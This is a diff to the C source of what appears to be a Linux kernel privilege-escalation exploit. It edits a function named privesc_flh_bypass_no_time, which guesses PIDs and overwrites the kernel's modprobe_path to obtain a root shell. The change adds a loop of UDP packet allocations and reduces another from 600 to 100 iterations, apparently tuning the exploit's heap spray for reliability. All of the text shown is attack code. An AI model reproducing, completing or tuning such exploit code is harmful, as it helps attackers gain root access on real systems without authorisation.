@@ -466,6 +466,11 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 						PRINTF_VERBOSE("[+] overwriting modprobe_path with different PIDs (%u-%u)...\n", pid_guess, pid_guess + 50);
 						PRINTF_VERBOSE("    - i.e. '%s' @ %p...\n", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
 						PRINTF_VERBOSE("    - matching modprobe_path scan var: '%s' @ %p)...\n", modprobe_path, modprobe_path);
+						for (int i=0; i < 100; i++)
+							{
+								//PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, 100);
+								alloc_ipv4_udp(1);
+							}
 					}
 						
 					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
@@ -480,9 +485,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 					if (status_cnt == 0)
 						continue;
 
-					for (int i=0; i < 600; i++)
+					for (int i=0; i < 100; i++)
 							{
-								PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, 600);
+								PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, 100);
 								alloc_ipv4_udp(1);
 							}
 
